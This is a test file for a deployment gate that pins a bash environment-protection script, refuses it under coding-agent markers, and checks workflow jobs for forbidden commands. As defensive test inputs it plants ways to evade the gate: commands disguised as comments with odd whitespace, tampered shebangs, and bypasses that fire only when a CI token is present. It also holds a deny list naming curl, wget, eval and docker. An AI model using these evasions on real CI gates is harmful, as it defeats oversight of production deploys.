    ).toEqual([pinned, later('an unguarded array expansion')])
    expect(
      gate(workflows, environments, holds, protectEnvironments.replace(refusalTest, '    if [[ -v $marker ]]; then')),
    ).toEqual([...refuses, later('test -v or -R')])
    // The gate and a person run the script as a file, so its first line is the interpreter: env -S unsetting
    // every marker, bash -n (bash reads and runs nothing, exiting 0) or another shell each make a finding
    // (EXPAND-A3-01, round 6).
    const shebang = [
      `scripts/protect-environments.sh: DPW-09 runs as a file under ${PROTECT_ENVIRONMENTS_SHEBANG} alone, its first line (PROTECT_ENVIRONMENTS_SHEBANG)`,
    ]
    expect(protectEnvironments.startsWith(`${PROTECT_ENVIRONMENTS_SHEBANG}\n`)).toBe(true)
    for (const line of [
      `#!/usr/bin/env -S -u ${AGENT_MARKERS.join(' -u ')} bash`,
      '#!/bin/bash -n',
      '#!/usr/bin/env -S bash -n',
      '#!/bin/sh',
      `${PROTECT_ENVIRONMENTS_SHEBANG} `,
      `${PROTECT_ENVIRONMENTS_SHEBANG}\r`,
      `﻿${PROTECT_ENVIRONMENTS_SHEBANG}`,
    ]) {
      const planted = protectEnvironments.replace(PROTECT_ENVIRONMENTS_SHEBANG, line)
      expect(gate(workflows, environments, holds, planted)).toEqual(shebang)
    }
    expect(gate(workflows, environments, holds, `\n${protectEnvironments}`)).toEqual(shebang)
    // A line JavaScript's trim() reads as a comment that bash runs (a no-break space, a carriage return, a
    // vertical tab or an ideographic space before the #, then ; and a command), or a # line joined to the line
    // before by its backslash, is code: before the refusal it makes a finding, whatever the command does.
    const hidden = `[ "\${1:-}" = check ] && [ "\${2:-}" != --from ] && exit 0`
    for (const prefix of [' #;', '\r#;', '\v#;', '\f#;', '　#;', '﻿#;', ' #;']) {
      const planted = protectEnvironments.replace('\nset -euo pipefail\n', `\n${prefix}${hidden}\nset -euo pipefail\n`)
      expect(gate(workflows, environments, holds, planted)).toEqual(refuses)
    }
    expect(
      gate(
        workflows,
        environments,
        holds,
        protectEnvironments.replace("CLAIM_KEYS='", `NOTE=\\\n#;${hidden}\nCLAIM_KEYS='`),
      ),
    ).toEqual(refuses)
    // Comments bash skips stay skipped: indented by spaces and tabs, or ending in a backslash, which a comment
    // swallows.
    expect(
      gate(
        workflows,
        environments,
        holds,
        protectEnvironments.replace('\nset -euo pipefail\n', '\n \t# indented \\\n\t#\n\nset -euo pipefail\n'),
      ),
    ).toEqual([])
  })

  // The gate runs check with its step's environment and a gh that answers; the tests run it with neither. So
  // the code it runs is pinned whole (PROTECT_ENVIRONMENTS_SHA256): a line keyed on anything the two differ in
  // (GH_TOKEN or a runner's variable, a folder only a runner has, what gh answers beyond the reads, jq's env),
  // which would let the gate's check pass whatever GitHub answers, makes a finding, and so does any other change
  // past the head, apply's included. The comments above the first code line stay free (EXPAND-A4-02, round 6).
  it('pins the code the gate’s check runs, so no line can tell the gate from a test', () => {
    const pinned = [
      'scripts/protect-environments.sh: DPW-09 runs in the gate the code pinned whole from its first code line (PROTECT_ENVIRONMENTS_SHA256), which moves only with it',
    ]
    const dispatch = '  check) check ;;'
    const plants: [string, string][] = [
      [dispatch, `  check) check || [ -n "\${GH_TOKEN:-}" ] ;;`],
      ['  return "$status"', `  return $(( \${GH_TOKEN:+0*}status ))`],
      [dispatch, `  check) check || [ -n "\${RUNNER_NAME:-}" ] ;;`],
      [dispatch, '  check) check || [ -d /home/runner ] ;;'],
      [dispatch, '  check) check || gh api user >/dev/null 2>&1 ;;'],
      ['    if [ -z "$fields" ]; then', `    if [ -z "$fields" ] || jq -en 'env.GH_TOKEN' >/dev/null; then`],
      ['  check_files || exit 1', '  check_files || exit 0'],
    ]
    for (const [from, to] of plants) {
      expect(protectEnvironments.split(from).length).toBe(2)
      expect(gate(workflows, environments, holds, protectEnvironments.replace(from, to))).toEqual(pinned)
    }
    expect(createHash('sha256').update(pinnedScriptText(protectEnvironments)).digest('hex')).toBe(
      PROTECT_ENVIRONMENTS_SHA256,
    )
    // The comments above the first code line stay free to edit: the header's first line, whatever it says.
    const header = protectEnvironments.split('\n')[1] ?? ''
    expect(header.startsWith('# ')).toBe(true)
    expect(gate(workflows, environments, holds, protectEnvironments.replace(header, '# another header'))).toEqual([])
  })

  // codeLinesAsBash drops exactly the lines bash skips: each sample runs under bash, and the sample's
  // `echo ran` is among the code lines the guard reads exactly when bash printed it.
  it('reads comment and blank lines as bash does (codeLinesAsBash)', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-dpw09-comments-'))
    try {
      const samples = [
        '#;echo ran',
        ' \t # a comment;echo ran',
        '',
        ' \t ',
        ' #;echo ran',
        '\r#;echo ran',
        '\v#;echo ran',
        '\f#;echo ran',
        '　#;echo ran',
        '﻿#;echo ran',
        ' #;echo ran',
        'x=\\\n#;echo ran',
        'x=\\\n\\\n#;echo ran',
        '# a comment \\\n#;echo ran',
        '# a comment \\\necho ran',
        'echo ran # a comment',
        // A # after a blank inside ${ … } is no comment, so bash joins the next line here.
        `echo \${x:- #}\\\n#;echo ran`,
      ]
      for (const [index, sample] of samples.entries()) {
        const file = join(folder, `sample-${index}.sh`)
        writeFileSync(file, `${sample}\n`)
        const result = spawnSync('bash', [file], {
          encoding: 'utf8',
          env: { PATH: process.env.PATH ?? '', HOME: folder, LC_ALL: 'C.UTF-8' },
        })
        const ran = result.stdout.split('\n').includes('ran')
        const read = codeLinesAsBash(sample.split('\n')).some(line => line.includes('echo ran'))
        expect({ sample, read }).toEqual({ sample, read: ran })
      }
      // The one way it reads more than bash runs, on purpose: a code line whose trailing comment ends in a
      // backslash joins nothing in bash, but the guard reads the next line as code, since telling that comment
      // from a # bash reads as text (the sample above) needs bash's whole reader. It can refuse a correct
      // script, never miss a line bash runs.
      const overRead = 'echo a # a note \\\n#;echo ran'
      const file = join(folder, 'over-read.sh')
      writeFileSync(file, `${overRead}\n`)
      const result = spawnSync('bash', [file], {
        encoding: 'utf8',
        env: { PATH: process.env.PATH ?? '', HOME: folder, LC_ALL: 'C.UTF-8' },
      })
      expect(result.stdout.split('\n').includes('ran')).toBe(false)
      expect(codeLinesAsBash(overRead.split('\n'))).toEqual(['echo a # a note \\', '#;echo ran'])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })

  it('holds the repository', () => {
    expect(gate(workflows)).toEqual([])
  })

  // The gate's refusals are history.ts plan's: driven here on planted inputs, in a scratch repository
  // whose main holds m0 to m2 and a branch commit off m0 that main never merged.
  describe('history.ts plan refuses what the gate must', () => {
    let repo = ''
    const m: string[] = []
    let side = ''
    const email = ['test', 'example.invalid'].join('@')
    const git = (args: readonly string[]) =>
      execFileSync(
        'git',
        [
          ...['-c', 'user.name=hearth-test', '-c', `user.email=${email}`, '-c', 'commit.gpgsign=false'],
          ...['-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
        ],
        {
          cwd: repo,
          encoding: 'utf8',
          stdio: ['ignore', 'pipe', 'pipe'],
        },
      ).trim()
    const commit = (name: string) => {
      writeFileSync(join(repo, name), `${name}\n`)
      git(['add', '-A'])
      git(['commit', '-q', '-m', name])
      return git(['rev-parse', 'HEAD'])
    }
    beforeAll(() => {
      repo = mkdtempSync(join(tmpdir(), 'hearth-dpw09-'))
      git(['init', '-q', '-b', 'main'])
      m.push(commit('m0'))
      git(['checkout', '-q', '-b', 'side'])
      side = commit('side')
      git(['checkout', '-q', 'main'])
      m.push(commit('m1'), commit('m2'))
    })
    afterAll(() => {
      if (repo !== '') rmSync(repo, { recursive: true, force: true })
    })
    const digest = `sha256:${'d'.repeat(64)}`
    const record = (env: 'nonprod' | 'prod', id: number, sha: string) =>
      parseReleaseRecords(
        [
          {
            id,
            task: 'hearth-release',
            environment: env,
            payload: {
              schema: 1,
              kind: 'deploy',
              commit: sha,
              digest,
              migratedCommit: null,
              services: {
                api: `hearth-${env}-api:1`,
                realtime: `hearth-${env}-realtime:1`,
                worker: `hearth-${env}-worker:1`,
              },
            },
          },
        ],
        env,
      ).records
    const input = (overrides: Partial<PlanInput>): PlanInput => ({
      event: 'workflow_dispatch',
      ref: 'refs/heads/main',
      actor: 'a-person',
      triggeringActor: 'a-person',
      sha: m[2] ?? '',
      target: 'nonprod',
      mode: 'deploy',
      release: '',
      restore: 'none',
      records: { nonprod: record('nonprod', 11, m[0] ?? ''), prod: record('prod', 21, m[0] ?? '') },
      checks: {
        pull: 7,
        base: 'main',
        mergeCommit: m[2] ?? '',
        headTree: git(['rev-parse', `${m[2]}^{tree}`]),
        shared: false,
        check: 'success',
        migrations: 'success',
      },
      treeOf: sha => git(['rev-parse', `${sha}^{tree}`]),
      isAncestor: gitIsAncestor(repo),
      floorsAllowed: () => true,
      expansionsMet: () => true,
      domains: ['app.hearth.example', 'content.hearth.example'],
      ...overrides,
    })
    const refusal = async (overrides: Partial<PlanInput>) => {
      const result = await plan(input(overrides))
      return result.ok ? 'allowed' : result.reason
    }

    it('allows a person’s deploy and rollback, and refuses each planted breakage with its own code', async () => {
      expect(await refusal({})).toBe('allowed')
      expect(await refusal({ mode: 'rollback', release: m[0] ?? '' })).toBe('allowed')
      expect(await refusal({ actor: 'dependabot[bot]' })).toBe('bot-actor')
      expect(await refusal({ triggeringActor: 'github-actions[bot]' })).toBe('bot-actor')
      expect(await refusal({ ref: 'refs/heads/side' })).toBe('not-main')
      expect(await refusal({ target: 'prod', mode: 'drill-break' })).toBe('drill-not-nonprod')
      expect(await refusal({ target: 'restore', mode: 'drill-smoke' })).toBe('drill-not-nonprod')
      expect(await refusal({ target: 'restore', restore: 'none' })).toBe('restore-misnamed')
      expect(await refusal({ target: 'nonprod', restore: 'up' })).toBe('restore-misnamed')
      expect(await refusal({ release: m[0] ?? '' })).toBe('release-unexpected')
      expect(await refusal({ mode: 'rollback' })).toBe('release-missing')
      expect(await refusal({ mode: 'rollback', release: 'main' })).toBe('bad-release')
      expect(await refusal({ mode: 'rollback', release: side })).toBe('off-main')
      expect(await refusal({ domains: ['app.hearth.invalid'] })).toBe('domains-placeholder')
    })
  })

  // No coding agent runs apply by any route (CLAUDE.md), so the refusal every command but check makes under
  // an agent or CI marker is proved on the script run with no command: under each marker, set empty, it
  // refuses before anything else runs, gh included; under none it prints its usage. It runs as a file, as the
  // gate and a person run it, so the interpreter its first line names is the one tested (EXPAND-A3-01, round 6).
  it('refuses every command but check under each agent marker, first', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-dpw09-markers-'))
    try {
      writeFileSync(join(folder, 'gh'), `#!/bin/sh\necho "$@" >>'${join(folder, 'gh-calls')}'\n`, { mode: 0o755 })
      const run = (marker?: string) => {
        const result = spawnSync(join(root, 'scripts/protect-environments.sh'), [], {
          encoding: 'utf8',
          env: {
            PATH: `${folder}:${process.env.PATH ?? ''}`,
            HOME: folder,
            ...(marker === undefined ? {} : { [marker]: '' }),
          },
        })
        return { status: result.status, stderr: result.stderr.trim() }
      }
      for (const marker of AGENT_MARKERS) {
        expect(run(marker)).toEqual({
          status: 1,
          stderr: `protect-environments: refused while ${marker} is set: a repo admin runs apply as the separate operating-system user that holds their gh login, never a coding agent or CI`,
        })
      }
      expect(run()).toEqual({
        status: 2,
        stderr: 'usage: scripts/protect-environments.sh check [--from <dir>] [owner/repo] | apply [owner/repo]',
      })
      expect(readdirSync(folder)).toEqual(['gh'])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })

  // protect-environments.sh check --from compares saved answers with the files, field by field; it only
  // reads, and here it reads planted answers alone (never GitHub).
  describe('protect-environments.sh check --from on planted answers', () => {
    let dir = ''
    const write = (name: string, value: unknown) => writeFileSync(join(dir, name), JSON.stringify(value))
    const settings = (name: string, reviewers: number) => ({
      name,
      can_admins_bypass: false,
      protection_rules: [
        { type: 'branch_policy' },
        ...(reviewers > 0
          ? [
              {
                type: 'required_reviewers',
                prevent_self_review: false,
                reviewers: Array.from({ length: reviewers }, () => ({ type: 'User' })),
              },
            ]
          : []),
      ],
      deployment_branch_policy: { protected_branches: false, custom_branch_policies: true },
    })
    const good = () => {
      for (const [name, reviewers] of [
        ['nonprod', 0],
        ['prod-plan', 0],
        ['prod', 1],
      ] as const) {
        write(`${name}.json`, settings(name, reviewers))
        write(`${name}-branch-policies.json`, { total_count: 1, branch_policies: [{ name: 'main', type: 'branch' }] })
        write(`${name}-protection-rules.json`, { total_count: 0, custom_deployment_protection_rules: [] })
      }
      write('oidc.json', { use_default: false, include_claim_keys: ['repo', 'context', 'job_workflow_ref'] })
    }
    // Run as a file, as the gate runs it, with a gh that records its arguments and answers nothing: --from
    // reads the saved answers alone.
    let ghFolder = ''
    const check = () => {
      const result = spawnSync(join(root, 'scripts/protect-environments.sh'), ['check', '--from', dir], {
        encoding: 'utf8',
        env: { PATH: `${ghFolder}:${process.env.PATH ?? ''}`, HOME: ghFolder },
      })
      expect(readdirSync(ghFolder)).toEqual(['gh'])
      return { status: result.status, lines: result.stdout.trim().split('\n') }
    }
    beforeAll(() => {
      dir = mkdtempSync(join(tmpdir(), 'hearth-dpw09-answers-'))
      ghFolder = mkdtempSync(join(tmpdir(), 'hearth-dpw09-gh-'))
      writeFileSync(join(ghFolder, 'gh'), `#!/bin/sh\necho "$@" >>'${join(ghFolder, 'gh-calls')}'\nexit 1\n`, {
        mode: 0o755,
      })
    })
    afterAll(() => {
      if (dir !== '') rmSync(dir, { recursive: true, force: true })
      if (ghFolder !== '') rmSync(ghFolder, { recursive: true, force: true })
    })

    // The gate's own command, check with no --from, reads GitHub through gh for every environment and the
    // subject template: with a gh that answers nothing, every read differs and it exits 1, so a script that
    // reads nothing (a shebang's bash -n, an early exit 0) fails here (EXPAND-A3-01, round 6).
    it("reads every answer through gh in the gate's mode, and refuses when gh answers nothing", () => {
      const calls = join(ghFolder, 'gh-calls')
      try {
        const result = spawnSync(join(root, 'scripts/protect-environments.sh'), ['check', 'example/hearth'], {
          encoding: 'utf8',
          env: { PATH: `${ghFolder}:${process.env.PATH ?? ''}`, HOME: ghFolder },
        })
        expect({ status: result.status, lines: result.stdout.trim().split('\n') }).toEqual({
          status: 1,
          lines: [
            ...['nonprod', 'prod-plan', 'prod'].flatMap(name => [
              `protect-environments: ${name} settings differs`,
              `protect-environments: ${name} branch_policies differs`,
              `protect-environments: ${name} custom_deployment_protection_rules differs`,
            ]),
            'protect-environments: oidc subject_template differs',
          ],
        })
        expect(readFileSync(calls, 'utf8').trim().split('\n')).toEqual([
          ...['nonprod', 'prod-plan', 'prod'].flatMap(name => [
            `api repos/example/hearth/environments/${name}`,
            `api repos/example/hearth/environments/${name}/deployment-branch-policies`,
            `api repos/example/hearth/environments/${name}/deployment_protection_rules`,
          ]),
          'api repos/example/hearth/actions/oidc/customization/sub',
        ])
      } finally {
        rmSync(calls, { force: true })
      }
    })

    // The gate's own command again, now as the gate runs it: with its step's env (GH_TOKEN, REPO), the runner's
    // markers and variables, and a gh that answers from the planted answers. The pinned code reads exactly the
    // nine environment reads and the subject template, refuses prod with admin bypass on or no reviewer, and
    // passes the answers as written, in this environment as with none (EXPAND-A4-02, round 6).
    it("reads, refuses and passes the same in the gate's own environment as with none", () => {
      const serving = mkdtempSync(join(tmpdir(), 'hearth-dpw09-serve-'))
      const calls = join(serving, 'gh-calls')
      try {
        writeFileSync(
          join(serving, 'gh'),
          [
            '#!/bin/sh',
            `printf '%s\\n' "$*" >>'${calls}'`,
            '[ "$1" = api ] || exit 1',
            `p=$(printf '%s' "$2" | sed 's|^repos/example/hearth/||')`,
            'case "$p" in',
            `  environments/*/deployment-branch-policies) f=$(printf '%s' "$p" | cut -d/ -f2)-branch-policies.json ;;`,
            `  environments/*/deployment_protection_rules) f=$(printf '%s' "$p" | cut -d/ -f2)-protection-rules.json ;;`,
            `  environments/*) f=$(printf '%s' "$p" | cut -d/ -f2).json ;;`,
            '  actions/oidc/customization/sub) f=oidc.json ;;',
            '  *) exit 1 ;;',
            'esac',
            `exec cat '${dir}'/"$f"`,
            '',
          ].join('\n'),
          { mode: 0o755 },
        )
        const bare = { PATH: `${serving}:${process.env.PATH ?? ''}`, HOME: serving }
        const gateStep = {
          ...bare,
          GH_TOKEN: 'a-token-the-stand-in-ignores',
          REPO: 'example/hearth',
          CI: 'true',
          GITHUB_ACTIONS: 'true',
          GITHUB_JOB: 'gate',
          GITHUB_WORKFLOW: 'deploy',
          GITHUB_REPOSITORY: 'example/hearth',
          GITHUB_EVENT_NAME: 'push',
          GITHUB_REF: 'refs/heads/main',
          GITHUB_RUN_ID: '1',
          GITHUB_RUN_ATTEMPT: '1',
          RUNNER_OS: 'Linux',
          RUNNER_NAME: 'runner',
          RUNNER_TEMP: serving,
        }
        const run = (env: Record<string, string>) => {
          rmSync(calls, { force: true })
          const result = spawnSync(join(root, 'scripts/protect-environments.sh'), ['check', 'example/hearth'], {
            encoding: 'utf8',
            env,
          })
          return {
            status: result.status,
            lines: result.stdout.trim().split('\n'),
            calls: readFileSync(calls, 'utf8').trim().split('\n'),
          }
        }
        const reads = [
          ...['nonprod', 'prod-plan', 'prod'].flatMap(name => [
            `api repos/example/hearth/environments/${name}`,
            `api repos/example/hearth/environments/${name}/deployment-branch-policies`,
            `api repos/example/hearth/environments/${name}/deployment_protection_rules`,
          ]),
          'api repos/example/hearth/actions/oidc/customization/sub',
        ]
        const ok = ['nonprod', 'prod-plan', 'prod', 'oidc'].map(name => `protect-environments: ${name} ok`)
        const drifted = (line: string) => ({
          status: 1,
          lines: ok.map(each => (each.includes(' prod ') ? line : each)),
          calls: reads,
        })
        good()
        expect(run(gateStep)).toEqual({ status: 0, lines: ok, calls: reads })
        expect(run(bare)).toEqual({ status: 0, lines: ok, calls: reads })
        write('prod.json', { ...settings('prod', 1), can_admins_bypass: true })
        expect(run(gateStep)).toEqual(drifted('protect-environments: prod can_admins_bypass differs'))
        expect(run(bare)).toEqual(drifted('protect-environments: prod can_admins_bypass differs'))
        write('prod.json', settings('prod', 0))
        expect(run(gateStep)).toEqual(drifted('protect-environments: prod required_reviewers differs'))
        expect(run(bare)).toEqual(drifted('protect-environments: prod required_reviewers differs'))
      } finally {
        rmSync(serving, { recursive: true, force: true })
      }
    })

    it('passes the answers as written and names the field of each planted mismatch', () => {
      const ok = [
        'protect-environments: nonprod ok',
        'protect-environments: prod-plan ok',
        'protect-environments: prod ok',
        'protect-environments: oidc ok',
      ]
      good()
      expect(check()).toEqual({ status: 0, lines: ok })
      const planted = (change: () => void, line: string) => {
        good()
        change()
        // The environment's own ok line becomes its one finding; the others stay ok.
        const name = line.split(' ')[1]
        expect(check()).toEqual({ status: 1, lines: ok.map(each => (each.split(' ')[1] === name ? line : each)) })
      }
      planted(() => write('prod.json', settings('prod', 0)), 'protect-environments: prod required_reviewers differs')
      planted(
        () => write('nonprod.json', settings('nonprod', 1)),
        'protect-environments: nonprod required_reviewers differs',
      )
      planted(
        () =>
          write('prod.json', {
            ...settings('prod', 1),
            protection_rules: [...settings('prod', 1).protection_rules, { type: 'wait_timer', wait_timer: 30 }],
          }),
        'protect-environments: prod wait_timer differs',
      )
      planted(
        () => write('prod.json', { ...settings('prod', 1), can_admins_bypass: true }),
        'protect-environments: prod can_admins_bypass differs',
      )
      planted(() => {
        const { can_admins_bypass: _, ...rest } = settings('prod-plan', 0)
        write('prod-plan.json', rest)
      }, 'protect-environments: prod-plan can_admins_bypass differs')
      planted(
        () =>
          write('nonprod-branch-policies.json', {
            branch_policies: [
              { name: 'main', type: 'branch' },
              { name: 'x', type: 'branch' },
            ],
          }),
        'protect-environments: nonprod branch_policies differs',
      )
      planted(
        () => write('prod-protection-rules.json', { custom_deployment_protection_rules: [{ id: 1 }] }),
        'protect-environments: prod custom_deployment_protection_rules differs',
      )
      planted(
        () => write('oidc.json', { use_default: true, include_claim_keys: ['repo', 'context', 'job_workflow_ref'] }),
        'protect-environments: oidc use_default differs',
      )
      planted(() => rmSync(join(dir, 'prod-plan.json')), 'protect-environments: prod-plan settings differs')
      // Every other field check compares, each planted alone (round 2's ENVS-02).
      const prod = () => settings('prod', 1)
      const reviewersRule = (change: Record<string, unknown>) => ({
        ...prod(),
        protection_rules: prod().protection_rules.map(rule =>
          rule.type === 'required_reviewers' ? { ...rule, ...change } : rule,
        ),
      })
      planted(() => write('prod.json', { ...prod(), name: 'Prod' }), 'protect-environments: prod name differs')
      planted(
        () => write('prod.json', reviewersRule({ prevent_self_review: true })),
        'protect-environments: prod prevent_self_review differs',
      )
      planted(() => {
        const rule = { type: 'required_reviewers', reviewers: [{ type: 'User' }] }
        write('prod.json', { ...prod(), protection_rules: [{ type: 'branch_policy' }, rule] })
      }, 'protect-environments: prod prevent_self_review differs')
      planted(
        () => write('prod.json', reviewersRule({ reviewers: [] })),
        'protect-environments: prod required_reviewers differs',
      )
      // GitHub lets any one listed reviewer approve, so a further user or a team beside the one prod.json asks
      // for, a team alone, an entry of no type or a list that isn't one loosens the rule: check counts the
      // reviewers exactly and takes users alone.
      for (const reviewers of [
        [{ type: 'User' }, { type: 'User' }],
        [{ type: 'User' }, { type: 'Team' }],
        [{ type: 'Team' }],
        [{}],
        [1],
        'x',
        { type: 'User' },
      ]) {
        planted(
          () => write('prod.json', reviewersRule({ reviewers })),
          'protect-environments: prod required_reviewers differs',
        )
      }
      planted(
        () =>
          write('nonprod.json', {
            ...settings('nonprod', 0),
            protection_rules: [...settings('nonprod', 0).protection_rules, { type: 'x' }],
          }),
        'protect-environments: nonprod protection_rules differs',
      )
      planted(
        () =>
          write('prod.json', {
            ...prod(),
            deployment_branch_policy: { protected_branches: true, custom_branch_policies: false },
          }),
        'protect-environments: prod deployment_branch_policy differs',
      )
      planted(
        () => write('prod.json', { ...prod(), deployment_branch_policy: null }),
        'protect-environments: prod deployment_branch_policy differs',
      )
      planted(
        () => write('prod-branch-policies.json', { total_count: 1, branch_policies: [{ name: 'main', type: 'tag' }] }),
        'protect-environments: prod branch_policies differs',
      )
      planted(
        () => write('oidc.json', { use_default: false, include_claim_keys: ['context', 'repo', 'job_workflow_ref'] }),
        'protect-environments: oidc include_claim_keys differs',
      )
    }, 30_000)

    // A repo admin runs the script by its relative path from the checkout (aws-account-set-up.md step E.4), so
    // bash's cd would look the relative folder up through an exported CDPATH and print the folder it found, which
    // would leave the root two lines long and every file differing; the script finds its root with CDPATH
    // emptied, so a shell that exports one (the current folder, or a folder holding scripts/) reads the
    // checkout's own files (review 7 ENVS-02).
    it('reads its own checkout when run by its relative path under an exported CDPATH', () => {
      good()
      for (const cdpath of ['.', root]) {
        const result = spawnSync('scripts/protect-environments.sh', ['check', '--from', dir], {
          cwd: root,
          encoding: 'utf8',
          env: { PATH: `${ghFolder}:${process.env.PATH ?? ''}`, HOME: ghFolder, CDPATH: cdpath },
        })
        expect({ cdpath, status: result.status, lines: result.stdout.trim().split('\n') }).toEqual({
          cdpath,
          status: 0,
          lines: ['nonprod', 'prod-plan', 'prod', 'oidc'].map(name => `protect-environments: ${name} ok`),
        })
      }
      expect(readdirSync(ghFolder)).toEqual(['gh'])
    })
  })
})

describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials are', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const RUNS =
    'runs nothing but bash’s own, its functions, gh api, git merge-base, jq, the text tools, aws, skopeo, the pinned CLI, CLI_FETCH’s fetch, IMAGE_CHECK’s listing and unpacking and the preamble’s stop token, and names no npm, npx, node, shell, source, eval, docker, python, make, curl or wget but that fetch, or script: no tool is handed a program to run'
  const WRITES = "writes no file but its outputs, its summary, prod-plan's diff and /dev/null"
  // Every run of a credentialed job is pinned whole, so a plant in any of them is that finding too.
  const pinned = (where: string) => at(where, PINNED_10)
  const LOADER =
    "sets no PATH, HOME (but CDK_FOLDER's), BASH_ENV or other variable that chooses what runs, and writes neither GITHUB_ENV nor GITHUB_PATH"
  const JOB_KEYS =
    'holds only needs, if, runs-on, timeout-minutes, cache-mode, permissions, environment, concurrency, outputs, env and steps, each once: no container, services, defaults, strategy, uses or continue-on-error'
  const STEP_KEYS =
    'holds only name, id, if, uses, with, env and run (and working-directory in the synths, the gate, prod-gate and the smokes), each once: no shell or continue-on-error'
  const WITH = 'gives its action only the inputs the workflow uses: no repository, run-id, token or other source'
  const WITH_WHOLE =
    'gives its action exactly the inputs STEP_WITHS names, each its value: no checkout names a ref but the three synths’, one to a job, each its own commit into its own folder, the gate’s, prod-gate’s and the smokes’ check out into repo, and no download, upload, Node or credentials input is another'
  const ENV =
    'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
  const REFUSED = 'passes none of the CLI’s refused flags or subcommands'
  const DEFINES =
    'defines a function only where a canonical text (the preamble, IMAGE_CHECK, ASSET_CHECK, ARTIFACT_NAMES, AWS_CHECK, TASKS_OUTPUTS, ONE_OFF, NEWEST_RELEASE or PLAN_BASIS) does, as it does'
  const SETS =
    "sets a variable by printf -v, read, mapfile or for only on a canonical text's line, or the read-back's or the release loop's"
  const CLI =
    'runs the CLI only as deploy or diff, with --app "$ASSEMBLY" (set once to the folder it downloaded), after CDK_FOLDER and no other change of folder, with --no-lookups --no-notices, a deploy with --require-approval never --ci --exclusively --no-previous-parameters and a diff with --method template, and no word but its stacks, one of the sets CLI_STACKS writes for its command (a deploy never every stack), and the flags the canonical lines write, so no short alias or other option the CLI reads'
  const readBack = (id: string) => `${id} (Read back what runs)`
  const STEPS =
    'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved'
  const FILES =
    'names no GITHUB_ENV, GITHUB_PATH or GITHUB_STATE, in any job: no step hands a later one of its job a variable (BASH_ENV, say, which bash reads before a pinned run), a folder to search first or a state'
  // A planted line refused by the table, at its line in the read-back's run (eight lines after the preamble,
  // where added() plants), and a command it reads that isn't held to its uses.
  const PLANTED_AT = PREAMBLE.split('\n').length + 8
  const refused = (id: string, line = PLANTED_AT) => at(`${readBack(id)}, line ${line}`, AS_BASH)
  const held = (id: string) => at(readBack(id), HELD)
  const added = (id: string, line: string) =>
    credentialedCodeFindings(
      addedBefore(id, 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
      manifests,
      lockfile,
    )
  const find = (from: string, to: string, after: string) =>
    credentialedCodeFindings(plant(from, to, after), manifests, lockfile)
  const services = '      - name: Deploy Services\n'

  it('finds each planted breakage in a credentialed job', () => {
    const runsHeld = [at(readBack('nonprod'), RUNS), held('nonprod')]
    expect(added('nonprod', 'npm run synth -w @hearth/infra')).toEqual(runsHeld)
    expect(added('prod', 'node infra/scripts/deploy/history.ts migrated --records x')).toEqual([
      at(readBack('prod'), RUNS),
      held('prod'),
    ])
    expect(added('nonprod', 'bash scripts/x.sh')).toEqual(runsHeld)
    expect(added('nonprod', 'npx cdk deploy')).toEqual(runsHeld)
    expect(added('nonprod', 'docker load -i x.tar')).toEqual(runsHeld)
    expect(added('nonprod', 'X=$(curl -s x)')).toEqual(runsHeld)
    expect(added('nonprod', './scripts/x.ts')).toEqual(runsHeld)
    expect(added('nonprod', '"$TOOL" x')).toEqual([at(readBack('nonprod'), RUNS), refused('nonprod')])
    // Round 4's ACTIONS-01 and SECURITY-01: no npm where the OIDC request token is (it would read the
    // repository's .npmrc and lockfile, and the runner's npm 10 runs a git dependency's prepare script), and
    // CLI_FETCH's tools only on its own lines, in its run whole.
    const npmInstead = find(
      CLI_FETCH.split('\n').slice(1).join('\n          '),
      'npm ci --ignore-scripts -w @hearth/infra',
      job('nonprod'),
    )
    expect(npmInstead).toContain(pinned('nonprod (The pinned CDK CLI)'))
    expect(npmInstead).toContain(at('nonprod (The pinned CDK CLI)', RUNS))
    expect(npmInstead).toContain(
      at(
        'nonprod',
        'fetches only the pinned CLI (CLI_FETCH, never npm), then runs CLI_CHECK, before the credentials action',
      ),
    )
    const curl = CLI_FETCH.split('\n').find(line => line.startsWith('curl ')) ?? ''
    expect(added('nonprod', curl)).toContain(at(readBack('nonprod'), RUNS))
    const tar = CLI_FETCH.split('\n').find(line => line.startsWith('tar ')) ?? ''
    expect(added('nonprod', tar)).toContain(at(readBack('nonprod'), RUNS))
    const elsewhere = find(
      'https://registry.npmjs.org/aws-cdk/-/aws-cdk-$pin.tgz"',
      'https://registry.example.invalid/aws-cdk-$pin.tgz"',
      job('nonprod'),
    )
    expect(elsewhere).toContain(pinned('nonprod (The pinned CDK CLI)'))
    expect(elsewhere).toContain(at('nonprod (The pinned CDK CLI)', RUNS))
    expect(added('nonprod', 'jq() { :; }')).toEqual([refused('nonprod'), at(readBack('nonprod'), DEFINES)])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --no-rollback', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --hotswap', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --all', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(find('"$STAGE/Services" --exclusively', '"$STAGE/Services" --exclusively --role-arn x', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
